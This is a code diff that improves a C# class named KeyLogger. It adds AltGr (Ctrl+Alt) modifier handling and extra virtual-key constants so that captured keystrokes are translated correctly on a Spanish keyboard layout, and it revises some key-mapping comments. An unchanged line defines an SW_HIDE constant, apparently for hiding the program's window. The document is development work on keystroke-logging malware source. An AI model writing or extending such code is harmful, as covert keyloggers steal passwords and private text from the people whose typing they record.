@@ -74,8 +74,18 @@ class KeyLogger
 
             if ((GetKeyState(VK_SHIFT) & 0x8000) != 0)
                 keyState[VK_SHIFT] = 0x80;
+
             if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
                 keyState[VK_CAPITAL] = 0x01;
+
+            bool ctrl = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
+            bool alt = (GetKeyState(VK_MENU) & 0x8000) != 0;
+
+            if (ctrl && alt)
+            {
+                keyState[VK_RMENU] = 0x80;
+                keyState[VK_CONTROL] = 0x80;
+            }
 
             StringBuilder buffer = new StringBuilder(5);
             int result = ToUnicodeEx((uint)vkCode, 0, keyState, buffer, buffer.Capacity, 0, layout);
@@ -85,7 +95,6 @@ class KeyLogger
 
             if (result > 0 && !string.IsNullOrWhiteSpace(raw))
             {
-                // Si es dead key o símbolo de control → mapear manualmente
                 if (char.IsControl(raw[0]) || (int)raw[0] == 0xFFFF)
                 {
                     key = MapKnownKey(vkCode);
@@ -132,12 +141,12 @@ class KeyLogger
             case 27: return "[ESC]";
             case 8: return "[BACKSPACE]";
             case 32: return "[SPACE]";
-            case 222: return "´";       // Dead key acento agudo
-            case 192: return "^";       // Dead key circunflejo
+            case 222: return "´";       // Acento agudo
+            case 192: return "^";       // Circunflejo (dead key en ES)
             case 219: return "[";       // Oem4
             case 221: return "]";       // Oem6
             case 220: return "\\";      // Oem5
-            case 186: return "ñ";       // Oem1
+            case 186: return "ñ";       // Oem1 (ES layout)
             case 187: return "=";
             case 189: return "-";
             case 188: return ",";
@@ -204,4 +213,7 @@ class KeyLogger
     private const int SW_HIDE = 0;
     private const int VK_SHIFT = 0x10;
     private const int VK_CAPITAL = 0x14;
+    private const int VK_MENU = 0x12;
+    private const int VK_CONTROL = 0x11;
+    private const int VK_RMENU = 0xA5;
 }
